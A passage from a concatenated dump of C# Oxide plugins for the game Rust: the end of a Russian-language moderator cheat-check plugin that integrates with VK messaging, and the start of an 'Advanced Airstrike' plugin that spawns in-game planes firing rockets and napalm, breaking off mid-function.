        void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            if (CheckCMDPlayer == player)
            {
                CheckCMDPlayer = null;
                PrintWarning($"Игрок {player.displayName} отключился во время проверки. Причина: {reason}.");
                if (config.mainSet.AutoBan && reason == "Disconnected")
                {
                    if (config.mainSet.BanCmd == "none") { player.IPlayer.Ban("Отказ от проверки"); }
                    else
                    {
                        string cmd = config.mainSet.BanCmd.Replace("{steamid}", player.UserIDString);
                        cmd = cmd.Replace("{reason}", "ОтказОтПроверки");
                        rust.RunServerCommand(cmd);
                    }
                    if (player.IsConnected) { player.Kick("banned"); }
                }
            }
            if (PlayersCheckList.ContainsValue(player))
            {
                CuiHelper.DestroyUi(player, "AlertGUI");
                foreach (var check in PlayersCheckList.Keys)
                {
                    if (PlayersCheckList[check] == player)
                    {
                        PlayersCheckList.Remove(check);
                        if (BasePlayer.activePlayerList.Contains(check)) { PrintToChat(check, string.Format(GetMsg("ИгрокОтключился", player))); }
                    }
                }
                if (config.mainSet.AutoBan && reason == "Disconnected")
                {
                    if (config.mainSet.BanCmd == "none") { player.IPlayer.Ban("Отказ от проверки"); }
                    else
                    {
                        string cmd = config.mainSet.BanCmd.Replace("{steamid}", player.UserIDString);
                        cmd = cmd.Replace("{reason}", "ОтказОтПроверки");
                        rust.RunServerCommand(cmd);
                    }
                    if (player.IsConnected) { player.Kick("banned"); }
                }
            }
            if (PlayersCheckList.ContainsKey(player))
            {
                var target = PlayersCheckList[player];
                if (BasePlayer.activePlayerList.Contains(target)) { CuiHelper.DestroyUi(target, "AlertGUI"); PrintToChat(target, string.Format(GetMsg("МодераторОтключился", player))); }
                PlayersCheckList.Remove(player);
            }
        }
        #endregion

        #region Commands
        private void CheckPlayerChat(BasePlayer player, string cmd, string[] args)
        {
            if (!permission.UserHasPermission(player.userID.ToString(), config.mainSet.PlCheckPerm)) { PrintToChat(player, string.Format(GetMsg("НетПрав", player))); return; }
            if (!VKBot) { PrintToChat(player, "Плагин VKBot не установлен!"); return; }
            if (PlayersCheckList.ContainsKey(player)) { PrintToChat(player, string.Format(GetMsg("ПроверкаНеЗакончена", player), config.mainSet.CMDunalert)); return; }
            if (PlayersCheckList.ContainsValue(player)) { PrintToChat(player, string.Format(GetMsg("ВыНаПроверке", player))); return; }
            if (CheckCMDPlayer == player) { PrintToChat(player, string.Format(GetMsg("ВыНаПроверке", player))); return; }
            PListUI(player);
        }
        private void UnCheckPlayerChat(BasePlayer player, string cmd, string[] args)
        {
            if (!permission.UserHasPermission(player.userID.ToString(), config.mainSet.PlCheckPerm)) { PrintToChat(player, string.Format(GetMsg("НетПрав", player))); return; }
            if (!PlayersCheckList.ContainsKey(player)) { PrintToChat(player, string.Format(GetMsg("НетПроверок", player))); return; }
            var target = PlayersCheckList[player];
            if (!BasePlayer.activePlayerList.Contains(target)) return;
            CuiHelper.DestroyUi(target, "AlertGUI");
            PrintToChat(player, string.Format(GetMsg("ПроверкаЗакончена", player), target.displayName));
            PlayersCheckList.Remove(player);
        }
        private void SendSkype(BasePlayer player, string cmd, string[] args)
        {
            if (CheckCMDPlayer != player && !PlayersCheckList.ContainsValue(player)) { PrintToChat(player, string.Format(GetMsg("НеНаПроверке", player))); return; }
            if (args.Length < 1) { PrintToChat(player, string.Format(GetMsg("КомандаСкайп", player), config.mainSet.CMDskype)); return; }
            string contact = args[0];
            string text = string.Format(GetMsg("СообщениеМодератору", player), player.displayName, player.UserIDString, contact);
            if (CheckCMDPlayer == player)
            {
                PrintWarning(text);
                if (config.mainSet.admChat) VKBot?.Call("VKAPIChatMsg", text);
                if (config.mainSet.admMsg)
                {
                    var reciverID = (string)VKBot?.Call("AdminVkID");
                    if (reciverID != null) VKBot?.Call("VKAPIMsg", text, "", reciverID, false);
                }
            }
            if (PlayersCheckList.ContainsValue(player))
            {
                ulong moderid = 0;
                foreach (var moder in PlayersCheckList.Keys)
                {
                    if (PlayersCheckList[moder] == player) moderid = moder.userID;
                }
                if (moderid == 0) return;
                var userVK = (string)VKBot?.Call("GetUserVKId", moderid);
                if (userVK == null) return;
                VKBot?.Call("VKAPIMsg", text, "", userVK, false);
            }
        }
        private void CheckPlayerCMD(ConsoleSystem.Arg arg)
        {
            if (arg.IsAdmin != true) { return; }
            if (CheckCMDPlayer != null) { PrintWarning($"Сначала закончите предыдущую проверку командой /{config.mainSet.CMDunalert}"); return; }
            if (arg.Args.Length < 1) { PrintWarning($"Команда вызова на проверку: {config.mainSet.CMDalert} steamid/name"); return; }
            var targets = FindPlayersOnline(arg.Args[0]);
            if (targets.Count <= 0) { PrintWarning($"Не удалось найти игрока {arg.Args[0]}"); return; }
            if (targets.Count > 1) { PrintWarning($"Найдено несколько игроков:"); Puts(string.Join(", ", targets.ConvertAll(p => p.displayName).ToArray())); return; }
            var target = targets[0];
            if (PlayersCheckList.ContainsValue(target)) { PrintWarning("Игрок уже на проверке."); return; }
            if (PlayersCheckList.ContainsKey(target)) { PrintWarning("Этот игрок выполняет проверку, вы не можете сейчас его вызвать."); return; }
            CheckCMDPlayer = target;
            StartGUI(target);
            PrintWarning($"Вы вызвали игрока {target.displayName} на проверку.");
        }
        private void StopCheckPlayerCMD(ConsoleSystem.Arg arg)
        {
            if (arg.IsAdmin != true) { return; }
            if (CheckCMDPlayer == null) { PrintWarning("Нет игроков на проверке."); return; }
            if (BasePlayer.activePlayerList.Contains(CheckCMDPlayer)) { CuiHelper.DestroyUi(CheckCMDPlayer, "AlertGUI"); PrintWarning($"Вы закончили проверку игрока {CheckCMDPlayer.displayName}"); CheckCMDPlayer = null; }
        }
        [ConsoleCommand("checkplayers.gui")]
        private void PListCMD(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();
            if (player == null) return;
            if (!permission.UserHasPermission(player.userID.ToString(), config.mainSet.PlCheckPerm)) { PrintToChat(player, string.Format(GetMsg("НетПрав", player))); return; }
            if (arg.Args == null) return;
            switch (arg.Args[0])
            {
                case "close":
                    CuiHelper.DestroyUi(player, "PListGUI");
                    break;
                case "alert":
                    ulong targetid = 0;
                    if (!ulong.TryParse(arg.Args[1], out targetid)) { PrintToChat(player, string.Format(GetMsg("ИгрокНеНайден", player))); return; }
                    var target = BasePlayer.FindByID(targetid);
                    if (target == null) { PrintToChat(player, string.Format(GetMsg("ИгрокНеНайден", player))); return; }
                    StartCheck(player, target);
                    break;
                case "page":
                    int page;
                    if (arg.Args.Length < 3) return;
                    if (!Int32.TryParse(arg.Args[1], out page)) return;
                    GUIManager.Get(player).Page = page;
                    CuiHelper.DestroyUi(player, "PListGUI");
                    PListUI(player);
                    break;
            }
        }
        #endregion

        #region GUIBuilder
        private CuiElement Panel(string name, string color, string anMin, string anMax, string parent = "Hud", bool cursor = false)
        {
            var Element = new CuiElement()
            {
                Name = name,
                Parent = parent,
                Components =
                {
                    new CuiImageComponent { Color = color },
                    new CuiRectTransformComponent { AnchorMin = anMin, AnchorMax = anMax }
                }
            };
            if (cursor)
            {
                Element.Components.Add(new CuiNeedsCursorComponent());
            }
            return Element;
        }
        private CuiElement Text(string parent, string color, string text, TextAnchor pos, int fsize, string anMin = "0 0", string anMax = "1 1", string fname = "robotocondensed-bold.ttf")
        {
            var Element = new CuiElement()
            {
                Parent = parent,
                Components =
                {
                    new CuiTextComponent() { Color = color, Text = text, Align = pos, Font = fname, FontSize = fsize },
                    new CuiRectTransformComponent{ AnchorMin = anMin, AnchorMax = anMax }
                }
            };
            return Element;
        }
        private CuiElement Button(string name, string parent, string command, string color, string anMin, string anMax)
        {
            var Element = new CuiElement()
            {
                Name = name,
                Parent = parent,
                Components =
                {
                    new CuiButtonComponent { Command = command, Color = color},
                    new CuiRectTransformComponent{ AnchorMin = anMin, AnchorMax = anMax }
                }
            };
            return Element;
        }
        private void UnloadAllGUI()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, "PListGUI");
                CuiHelper.DestroyUi(player, "AlertGUI");
            }
        }
        #endregion

        #region AlertPlayerGUI
        private void StartGUI(BasePlayer player)
        {
            CuiElementContainer container = new CuiElementContainer();
            container.Add(Panel("AlertGUI", "0.0 0.0 0 0.35", config.mainSet.GUIAnchorMin, config.mainSet.GUIAnchorMax));
            container.Add(Text("AlertGUI", "1 1 1 1", String.Format(config.mainSet.PlCheckText), TextAnchor.MiddleCenter, 23));
            CuiHelper.AddUi(player, container);
        }
        private void StopGui(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, "AlertGUI");
        }
        #endregion

        #region PlayersListGUI        
        private void PListUI(BasePlayer player)
        {
            string text = "Выберите игрока которого хотите вызвать на проверку.";
            List<BasePlayer> players = new List<BasePlayer>();
            foreach (var pl in BasePlayer.activePlayerList)
            {
                if (pl == player) continue;
                players.Add(pl);
            }
            if (players.Count == 0) { PrintToChat(player, "На сервере нет никого кроме вас."); return; }
            players = players.OrderBy(x => x.displayName).ToList();
            int maxPages = CalculatePages(players.Count);
            string pageNum = (maxPages > 1) ? $" - {GUIManager.Get(player).Page}" : "";
            CuiElementContainer container = new CuiElementContainer();
            container.Add(Panel("PListGUI", "0 0 0 0.75", "0.2 0.125", "0.8 0.9", "Hud", true));
            container.Add(Panel("header", "0 0 0 0.75", "0 0.93", "1 1", "PListGUI"));
            if (maxPages != 1) text = text + " Страница " + pageNum.ToString();
            container.Add(Text("header", "1 1 1 1", text, TextAnchor.MiddleCenter, 20));
            container.Add(Button("close", "header", "checkplayers.gui close", "1 0 0 1", "0.94 0.01", "1.0 0.98"));
            container.Add(Text("close", "1 1 1 1", "X", TextAnchor.MiddleCenter, 20));
            container.Add(Panel("playerslist", "0 0 0 0.75", "0 0", "1 0.9", "PListGUI"));
            var page = GUIManager.Get(player).Page;
            int playerCount = (page * 100) - 100;
            for (int j = 0; j < 20; j++)
            {
                for (int i = 0; i < 5; i++)
                {
                    if (players.ToArray().Length <= playerCount) continue;
                    string AnchorMin = (0.2f * i).ToString() + " " + (1f - (0.05f * j) - 0.05f).ToString();
                    string AnchorMax = ((0.2f * i) + 0.2f).ToString() + " " + (1f - (0.05f * j)).ToString();
                    string playerName = players.ToArray()[playerCount].displayName;
                    string id = players.ToArray()[playerCount].UserIDString;
                    container.Add(Panel($"pn{id}", "0 0 0 0", AnchorMin, AnchorMax, "playerslist"));
                    container.Add(Button($"plbtn{id}", $"pn{id}", $"checkplayers.gui alert {id}", "0 0 0 0.85", "0.05 0.05", "0.95 0.95"));
                    container.Add(Text($"plbtn{id}", "1 1 1 1", UserName(playerName), TextAnchor.MiddleCenter, 18));
                    playerCount++;
                }
            }
            if (page < maxPages)
            {
                container.Add(Button("npg", "PListGUI", $"checkplayers.gui page {(page + 1).ToString()}", "0 0 0 0.75", "1.025 0.575", "1.1 0.675"));
                container.Add(Text("npg", "1 1 1 1", ">>", TextAnchor.MiddleCenter, 16));
            }
            if (page > 1)
            {
                container.Add(Button("ppg", "PListGUI", $"checkplayers.gui page {(page - 1).ToString()}", "0 0 0 0.75", "1.025 0.45", "1.1 0.55"));
                container.Add(Text("ppg", "1 1 1 1", ">>", TextAnchor.MiddleCenter, 16));
            }
            CuiHelper.AddUi(player, container);
        }
        int CalculatePages(int value) => (int)Math.Ceiling(value / 100d);
        class GUIManager
        {
            public static Dictionary<BasePlayer, GUIManager> Players = new Dictionary<BasePlayer, GUIManager>();
            public int Page = 1;
            public static GUIManager Get(BasePlayer player)
            {
                if (Players.ContainsKey(player)) return Players[player];
                Players.Add(player, new GUIManager());
                return Players[player];
            }
        }
        #endregion

        #region Main        
        private void StartCheck(BasePlayer moder, BasePlayer target)
        {
            if (PlayersCheckList.ContainsValue(target)) { PrintToChat(moder, string.Format(GetMsg("ИгрокУжеНаПроверке", moder))); return; }
            if (PlayersCheckList.ContainsKey(target)) { PrintToChat(moder, string.Format(GetMsg("ИгрокВыполняетПроверку", moder))); return; }
            if (CheckCMDPlayer == target) { PrintToChat(moder, string.Format(GetMsg("ИгрокУжеНаПроверке", moder))); return; }
            var userVK = (string)VKBot?.Call("GetUserVKId", moder.userID);
            if (userVK == null) { PrintToChat(moder, string.Format(GetMsg("НетВК", moder))); return; }
            PlayersCheckList.Add(moder, target);
            StartGUI(target);
            PrintToChat(moder, string.Format(GetMsg("ИгрокВызванНаПроверку", moder), target.displayName));
        }
        #endregion

        #region Helpers
        private string UserName(string name)
        {
            if (name.Length > 15)
            {
                name = name.Remove(12) + "...";
            }
            return name;
        }
        private static List<BasePlayer> FindPlayersOnline(string nameOrIdOrIp)
        {
            var players = new List<BasePlayer>();
            if (string.IsNullOrEmpty(nameOrIdOrIp)) return players;
            foreach (var activePlayer in BasePlayer.activePlayerList)
            {
                if (activePlayer.UserIDString.Equals(nameOrIdOrIp))
                    players.Add(activePlayer);
                else if (!string.IsNullOrEmpty(activePlayer.displayName) && activePlayer.displayName.Contains(nameOrIdOrIp, CompareOptions.IgnoreCase))
                    players.Add(activePlayer);
                else if (activePlayer.net?.connection != null && activePlayer.net.connection.ipaddress.Equals(nameOrIdOrIp))
                    players.Add(activePlayer);
            }
            return players;
        }
        #endregion

        #region Langs
        private void LoadMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                {"ИгрокОтключился", "<size=17>Игрок вызванный на проверку покинул сервер. Причина: <color=#049906>{0}</color>.</size>"},
                {"МодераторОтключился", "<size=17>Модератор отключился от сервера, ожидайте следующей проверки.</size>"},
                {"НетПрав", "<size=17>У вас нет прав для использования данной команды</size>"},
                {"НетВК", "<size=17>Сначала добавьте и подтвердите свой профиль ВК командой /vk</size>" },
                {"ИгрокНеНайден", "<size=17>Игрок не найден</size>"},
                {"ВыНаПроверке", "<size=17>Вас вызвали на проверку, вы не можете использовать эту команду сейчас.</size>"},
                {"ПроверкаЗакончена", "<size=17>Вы закончили проверку игрока <color=#049906>{0}</color></size>"},
                {"ИгрокУжеНаПроверке", "<size=17>Этого игрока уже вызвали на проверку</size>"},
                {"НетПроверок", "<size=17>У вас нет активных проверок.</size>"},
                {"ИгрокВыполняетПроверку", "<size=17>Этот игрок выполняет проверку, вы не можете сейчас его вызвать.</size>"},
                {"ПроверкаНеЗакончена", "<size=17>Сначала закончите предыдущую проверку командой /{0}</size>"},
                {"ИгрокВызванНаПроверку", "<size=17>Вы вызвали игрока <color=#049906>{0}</color> на проверку</size>"},
                {"НеНаПроверке", "<size=17>Вас не вызывали на проверку. Ваш скайп нам не нужен <color=#049906>:)</color></size>"},
                {"СкайпОтправлен", "<size=17>Ваш скайп был отправлен модератору. Ожидайте звонка.</size>"},
                {"КомандаСкайп", "<size=17>Команда <color=#049906>/{0} НИК в СКАЙПЕ</color></size>"},
                {"СообщениеМодератору", "[CheckPlayers] Игрок {0} (steamcommunity.com/profiles/{1}/) предоставил скайп для проверки: {2}"}
            }, this);
        }
        string GetMsg(string key, BasePlayer player = null) => GetMsg(key, player.UserIDString);
        string GetMsg(string key, object userID = null) => lang.GetMessage(key, this, userID == null ? null : userID.ToString());
        #endregion
    }
}

// --- End of file: CheckPlayers.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/AdvAirstrike.cs ---
// --- Original Local Path: AdvAirstrike.cs ---

﻿using System;
using System.Collections.Generic;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Configuration;
using Oxide.Core.Plugins;
using UnityEngine;
using System.Linq;
using Rust;
using Facepunch;
using System.Collections;

namespace Oxide.Plugins
{
    [Info("Advanced Airstrike", "k1lly0u", "0.1.75")]
    class AdvAirstrike : RustPlugin
    {
        #region Fields
        [PluginReference]
        Plugin Economics, ServerRewards, Spawns, NoEscape;

        StoredData storedData;
        private DynamicConfigFile data;

        private Dictionary<ulong, StrikeType> toggleList = new Dictionary<ulong, StrikeType>();

        private Dictionary<string, int> shortnameToId = new Dictionary<string, int>();
        private Dictionary<string, string> shortnameToDn = new Dictionary<string, string>();
        private Hash<ulong, double> playerCooldowns = new Hash<ulong, double>();

        private List<StrikeType> availableTypes = new List<StrikeType>();
        private List<RadiationEntry> radiationZones = new List<RadiationEntry>();

        private List<BaseEntity> strikeSignals = new List<BaseEntity>();

        private static AdvAirstrike ins;
                
        const string cargoPlanePrefab = "assets/prefabs/npc/cargo plane/cargo_plane.prefab";
        const string basicRocket = "assets/prefabs/npc/patrol helicopter/rocket_heli.prefab";
        const string fireRocket = "assets/prefabs/npc/patrol helicopter/rocket_heli_napalm.prefab";
        const string tankShell = "assets/prefabs/npc/m2bradley/maincannonshell.prefab";
        const string heliExplosion = "assets/prefabs/npc/patrol helicopter/effects/heli_explosion.prefab";
        const string fireball = "assets/bundled/prefabs/oilfireballsmall.prefab";
        const string c4Explosion = "assets/prefabs/tools/c4/effects/c4_explosion.prefab";
        const string debris = "assets/prefabs/npc/patrol helicopter/damage_effect_debris.prefab";
        const string bulletExp = "assets/bundled/prefabs/fx/impacts/additive/explosion.prefab";
        const string fireCannonEffect = "assets/prefabs/npc/m2bradley/effects/maincannonattack.prefab";

        static int layerMaskExpl = LayerMask.GetMask("Deployed", "AI", "Vehicle_Movement", "Player_Server", "Construction");

        enum StrikeType { None, Strike, Squad, Napalm, Nuke, Spectre }
        enum FireType { Rocket, Bullet, Cannon, Combined }
        #endregion

        #region Oxide Hooks
        private void Loaded()
        {
            data = Interface.Oxide.DataFileSystem.GetFile("advairstrike_data");

            lang.RegisterMessages(Messages, this);

            foreach(var type in Enum.GetValues(typeof(StrikeType)))
            {
                permission.RegisterPermission($"advairstrike.signal.{type.ToString().ToLower()}", this);
                permission.RegisterPermission($"advairstrike.purchase.{type.ToString().ToLower()}", this);
                permission.RegisterPermission($"advairstrike.chat.{type.ToString().ToLower()}", this);
            }            
            permission.RegisterPermission("advairstrike.ignorecooldown", this);
        }

        private void OnServerInitialized()
        {
            ins = this;
            LoadData();

            shortnameToId = ItemManager.itemList.ToDictionary(x => x.shortname, y => y.itemid);
            shortnameToDn = ItemManager.itemList.ToDictionary(x => x.shortname, y => y.displayName.translated);

            PrepareRandomStrikes();
        }

        private void Unload()
        {
            ins = null;

            BasePlane[] objects = UnityEngine.Object.FindObjectsOfType<BasePlane>();
            if (objects != null)
            {
                foreach (BasePlane obj in objects)
                    UnityEngine.Object.Destroy(obj);
            }
            RocketMonitor[] monitors = UnityEngine.Object.FindObjectsOfType<RocketMonitor>();
            if (monitors != null)
            {
                foreach (RocketMonitor obj in monitors)
                    UnityEngine.Object.Destroy(obj);
            }

            for (int i = 0; i < radiationZones.Count; i++)
            {
                radiationZones[i].time.Destroy();
                UnityEngine.Object.Destroy(radiationZones[i].zone);
            }
            radiationZones.Clear();
        }

        private void OnServerSave() => SaveData();

        private void OnExplosiveDropped(BasePlayer player, BaseEntity entity) => OnExplosiveThrown(player, entity);

        private void OnExplosiveThrown(BasePlayer player, BaseEntity entity)
        {
            if (toggleList.ContainsKey(player.userID) && entity is SupplySignal)
            {
                strikeSignals.Add(entity);

                StrikeType type = toggleList[player.userID];
                toggleList.Remove(player.userID);
                AddCooldownData(player, type);

                entity.CancelInvoke((entity as SupplySignal).Explode);
                entity.Invoke(() =>
                {
                    strikeSignals.Remove(entity);
                    entity.KillMessage();
                }, 30f);

                timer.Once(3, () =>
                {
                    Effect.server.Run("assets/bundled/prefabs/fx/smoke_signal_full.prefab", entity, 0, new Vector3(), new Vector3());
                    SendStrike(player, type, entity.transform.position);
                });
            }
        }
        #endregion

        #region Plane Control
        private class NapalmPlane : BasePlane
        {
            private void Awake()
            {
                entity = GetComponent<CargoPlane>();
                entity.enabled = false;
                rocketOptions = ins.configData.Rocket;
                fireDistance = ins.configData.Plane.Distance;

                forcedType = fireRocket;
                enabled = false;
            }
            public override void LaunchRocket()
            {
                if (projectilesFired >= rocketOptions.Amount)
                {
                    InvokeHandler.CancelInvoke(this, LaunchRocket);
                    return;
                }
                                
                BaseEntity rocket = FireRocket();
                rocket.gameObject.AddComponent<RocketMonitor>().SetType(StrikeType.Napalm);
                ++projectilesFired;
            }
        }

        private class NukePlane : BasePlane
        {
            private void Awake()
            {
                entity = GetComponent<CargoPlane>();
                entity.enabled = false;
                rocketOptions = ins.configData.Rocket;

                forcedType = basicRocket;
                enabled = false;
            }
            public override void LaunchRocket()
            {
                InvokeHandler.CancelInvoke(this, LaunchRocket);
                
                BaseEntity rocket = FireRocket();
                rocket.gameObject.AddComponent<RocketMonitor>().SetType(StrikeType.Nuke);
                ++projectilesFired;
            }
        }

        private class SpectrePlane : BasePlane
        {
            private bool inOrbit;
            private float flightRadius;
            private Vector3 beginOrbit;
            private float distance;
            private float speed;
            private int rotations;
            private bool isLeaning;

            private void Awake()
            {
                entity = GetComponent<CargoPlane>();
                entity.enabled = false;
                rocketOptions = ins.configData.Rocket;

                this.flightRadius = ins.configData.Plane.FlightRadius;
                distance = Convert.ToSingle(Math.PI * (flightRadius * 2));
                speed = ins.configData.Plane.Speed;
                enabled = false;
            }
            
            public override void InitializeFlightPath(Vector3 targetPos, StrikeType strikeType = StrikeType.Spectre)
            {
                CheckFireType(strikeType);
                this.strikeType = strikeType;
                this.targetPos = targetPos;

                float size = TerrainMeta.Size.x;
                float highestPoint = 170f;

                startPos = Vector3Ex.Range(-1f, 1f);
                startPos.y = 0f;
                startPos.Normalize();
                startPos = startPos * (size * 2f);
                startPos.y = highestPoint;

                endPos = startPos * -1f;
                endPos.y = startPos.y;
                startPos = startPos + targetPos;
                endPos = endPos + targetPos;

                secondsToTake = (Vector3.Distance(startPos, endPos) / ins.configData.Plane.Speed) * UnityEngine.Random.Range(0.95f, 1.05f);
                                
                entity.transform.rotation = Quaternion.LookRotation(endPos - startPos);

                startPos = startPos + (-entity.transform.right * flightRadius);
                endPos = endPos + (-entity.transform.right * flightRadius);
                beginOrbit = targetPos + (-entity.transform.right * flightRadius);
                beginOrbit.y = startPos.y;

                entity.transform.position = startPos;

                enabled = true;
            }
            public override void MovePlane()
            {                
                if (!inOrbit)
                {
                    Rotate();

                    secondsTaken += Time.deltaTime;
                    float single = Mathf.InverseLerp(0f, secondsToTake, secondsTaken);

                    entity.transform.position = Vector3.Lerp(startPos, endPos, single);
                    entity.transform.hasChanged = true;
                    if (single >= 1f)
                        entity.Kill(BaseNetworkable.DestroyMode.None);
                }
                else
                {
                    Rotate();
                    entity.transform.RotateAround(targetPos, Vector3.up, distance / speed * Time.deltaTime);
                }
            }            
            private void Rotate()
            {
                if (rotations < 600 && isLeaning)
                {
                    entity.transform.rotation = Quaternion.Euler(new Vector3(entity.transform.rotation.eulerAngles.x, entity.transform.rotation.eulerAngles.y, entity.transform.rotation.eulerAngles.z - 0.05f));
                    ++rotations;
                }
                if (rotations > 0 && !isLeaning)
                {
                    entity.transform.rotation = Quaternion.Euler(new Vector3(entity.transform.rotation.eulerAngles.x, entity.transform.rotation.eulerAngles.y, entity.transform.rotation.eulerAngles.z + 0.05f));
                    --rotations;
                }
            }
            
            public override void CanFireRockets()
            {
                if (!isFiring && Vector3.Distance(entity.transform.position, beginOrbit) < 2)
                {
                    entity.transform.rotation = Quaternion.Euler(new Vector3(entity.transform.rotation.eulerAngles.x, entity.transform.rotation.eulerAngles.y, 359.95f));
                    isLeaning = true;
                    inOrbit = true;
                    isFiring = true;
                    TryFireWeapons();                    
                }
            }
            public override void OnAmmunitionDepleted()
            {
                startPos = entity.transform.position;
                endPos = entity.transform.forward * Vector3.Distance(entity.transform.position, endPos);
                secondsToTake /= 2;
                secondsTaken = 0;
                isLeaning = false;
                inOrbit = false;                
            }
        }

        private class BasePlane : MonoBehaviour
        {
            internal CargoPlane entity;
            internal RocketOptions rocketOptions;
            internal CannonOptions cannonOptions;
            internal GunOptions gunOptions;
            internal FireType fireType = FireType.Rocket;
            internal StrikeType strikeType = StrikeType.None;

            internal Vector3 startPos;
            internal Vector3 endPos;
            internal Vector3 targetPos;

            internal float secondsToTake;
            internal float secondsTaken;
            internal bool isFiring;
            internal int projectilesFired;
            internal int projectilesFiredGun;
            internal string forcedType;
            
            internal float fireDistance;

            private AutoTurret autoTurret;           

            private void Awake()
            {
                entity = GetComponent<CargoPlane>();
                entity.enabled = false;                
                rocketOptions = ins.configData.Rocket;                
                fireDistance = ins.configData.Plane.Distance;

                enabled = false;
            }
            private void Update()
            {
                CanFireRockets();
                MovePlane();
            }
            private void OnDestroy()
            {
                InvokeHandler.CancelInvoke(this, FireGun);
                InvokeHandler.CancelInvoke(this, LaunchRocket);
                if (autoTurret != null && !autoTurret.IsDestroyed)
                    autoTurret.Kill();
                if (entity != null && !entity.IsDestroyed)
                    entity.Kill();
            }

            public virtual void InitializeFlightPath(Vector3 targetPos, StrikeType strikeType)
            {
                CheckFireType(strikeType);
                this.strikeType = strikeType;
                this.targetPos = targetPos;

                float size = TerrainMeta.Size.x;
                float highestPoint = 170f;

                startPos = Vector3Ex.Range(-1f, 1f);
                startPos.y = 0f;
                startPos.Normalize();
                startPos = startPos * (size * 2f);
                startPos.y = highestPoint;

                endPos = startPos * -1f;
                endPos.y = startPos.y;
                startPos = startPos + targetPos;
                endPos = endPos + targetPos;

                secondsToTake = (Vector3.Distance(startPos, endPos) / ins.configData.Plane.Speed) * UnityEngine.Random.Range(0.95f, 1.05f);

                entity.transform.position = startPos;
                entity.transform.rotation = Quaternion.LookRotation(endPos - startPos);

                if (fireType == FireType.Bullet && fireDistance > 250)
                    fireDistance = 250;

                if (strikeType == StrikeType.Nuke)                
                    fireDistance = (entity.transform.position.y - targetPos.y) + 10f;                
                
                enabled = true;
            }
            internal void CheckFireType(StrikeType strikeType)
            {
                if (ins.configData.Types.ContainsKey(strikeType))                                    
                    fireType = ins.ParseType<FireType>(ins.configData.Types[strikeType]);

                if (fireType == FireType.Bullet || fireType == FireType.Combined)
                {
                    cannonOptions = ins.configData.Cannon;
                    gunOptions = ins.configData.Gun[strikeType];
                    autoTurret = (AutoTurret)GameManager.server.CreateEntity("assets/prefabs/npc/autoturret/autoturret_deployed.prefab", transform.position);
                    autoTurret.Spawn();
                    autoTurret.enableSaving = false;
                    autoTurret.SetParent(entity, 0);
                    autoTurret.transform.localEulerAngles = new Vector3(0, 0, 180);
                    autoTurret.transform.localPosition = new Vector3();

                    (autoTurret as BaseCombatEntity).baseProtection = Resources.FindObjectsOfTypeAll<ProtectionProperties>().ToList().FirstOrDefault(p => p.name == "Immortal");
                }      
                else if (fireType == FireType.Cannon)
                    cannonOptions = ins.configData.Cannon;
            }
            public virtual void CanFireRockets()
            {
                if (!isFiring && Vector3.Distance(transform.position, targetPos) <= fireDistance)
                {
                    isFiring = true;
                    TryFireWeapons();
                }
            }
            public virtual void MovePlane()
            {
                secondsTaken += Time.deltaTime;
                float single = Mathf.InverseLerp(0f, secondsToTake, secondsTaken);
                
                entity.transform.position = Vector3.Lerp(startPos, endPos, single);
                entity.transform.hasChanged = true;
                if (single >= 1f)                
                    entity.Kill(BaseNetworkable.DestroyMode.None);                
            }
            public void GetFlightData(out Vector3 startPos, out Vector3 endPos, out float secondsToTake)
            {
                startPos = this.startPos;
                endPos = this.endPos;
                secondsToTake = this.secondsToTake;
            }
            public void SetFlightData(Vector3 startPos, Vector3 endPos, Vector3 targetPos, float secondsToTake)
            {
                strikeType = StrikeType.Squad;
                CheckFireType(strikeType);

                this.startPos = startPos;
                this.endPos = endPos;
                this.targetPos = targetPos;
                this.secondsToTake = secondsToTake;

                entity.transform.position = startPos;
                entity.transform.rotation = Quaternion.LookRotation(endPos - startPos);                

                enabled = true;
            }
            internal void TryFireWeapons()
            {
                if (fireType == FireType.Bullet)
                    InvokeHandler.InvokeRepeating(this, FireGun, 0, gunOptions.FireRate);
                else if (fireType == FireType.Combined)
                {
                    InvokeHandler.InvokeRepeating(this, FireGun, 0, gunOptions.FireRate);
                    InvokeHandler.InvokeRepeating(this, LaunchRocket, 0, strikeType == StrikeType.Spectre ? cannonOptions.IntervalSpectre : cannonOptions.Interval);
                }
                else InvokeHandler.InvokeRepeating(this, LaunchRocket, 0, strikeType == StrikeType.Spectre ? (fireType == FireType.Rocket ? rocketOptions.IntervalSpectre : cannonOptions.IntervalSpectre) : (fireType == FireType.Rocket ? rocketOptions.Interval : cannonOptions.Interval));
            }
                       
            public virtual void LaunchRocket()
            {
                if (projectilesFired >= (fireType == FireType.Rocket ? rocketOptions.Amount : cannonOptions.Amount))
                {
                    if (fireType != FireType.Combined || (fireType == FireType.Combined && !InvokeHandler.IsInvoking(this, FireGun)))
                        OnAmmunitionDepleted();
                    
                    InvokeHandler.CancelInvoke(this, LaunchRocket);
                    return;
                }

                if (fireType == FireType.Combined || fireType == FireType.Cannon)
                    FireCannon();
                else FireRocket();
                ++projectilesFired;

            }

            public virtual void OnAmmunitionDepleted()
            {                
            }

            internal BaseEntity FireCannon()
            {
                Effect.server.Run(fireCannonEffect, entity, 0u, Vector3.zero, Vector3.zero, null, false);
               
                float accuracy = GetComponent<SpectrePlane>() ? cannonOptions.SpectreAccuracy : cannonOptions.Accuracy;
                Vector3 launchPos = entity.transform.position;
                Vector3 newTarget = Quaternion.Euler(GetRandom(accuracy), GetRandom(accuracy), GetRandom(accuracy)) * targetPos;

                BaseEntity rocket = GameManager.server.CreateEntity(tankShell, launchPos, new Quaternion(), true);

                TimedExplosive rocketExplosion = rocket.GetComponent<TimedExplosive>();
                               
                for (int i = 0; i < rocketExplosion.damageTypes.Count; i++)
                    rocketExplosion.damageTypes[i].amount *= cannonOptions.Damage;

                Vector3 newDirection = (newTarget - launchPos);

                rocket.SendMessage("InitializeVelocity", newDirection);
                rocket.Spawn();
                return rocket;
            }

            internal BaseEntity FireRocket()
            {
                string rocketType = forcedType;
                if (string.IsNullOrEmpty(forcedType))
                {
                    rocketType = rocketOptions.Type == "Normal" ? basicRocket : fireRocket;
